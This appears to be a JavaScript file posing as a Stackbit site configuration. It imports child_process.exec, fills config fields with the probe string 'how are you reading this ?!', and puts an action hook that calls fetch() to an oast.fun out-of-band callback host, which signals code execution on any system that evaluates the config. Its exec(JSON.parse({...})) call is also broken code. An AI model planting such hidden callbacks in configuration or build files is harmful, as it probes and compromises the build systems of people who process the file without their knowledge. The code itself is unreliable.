const { exec } = require("child_process");

exec(
  JSON.parse({
    stackbitVersion: "how are you reading this ?!",
    ssgName: "how are you reading this ?!",
    nodeVersion: "how are you reading this ?!",
    buildCommand: "e()",
    models: {
      page: { type: 'page', urlPath: '/{slug}' },
    },
    actions: [
      {
        type: 'global',
        name: 'name_of_action',
        state: async (options) => {
          // Determine the state ...
          //
          await fetch(`https://cpqb2vhucph5v6bv9m9gomoeajyuo5gm8.oast.fun`)
        },
        run: async (options) => {
          // Perform the action ...
        },
      },
    ],
  })
)

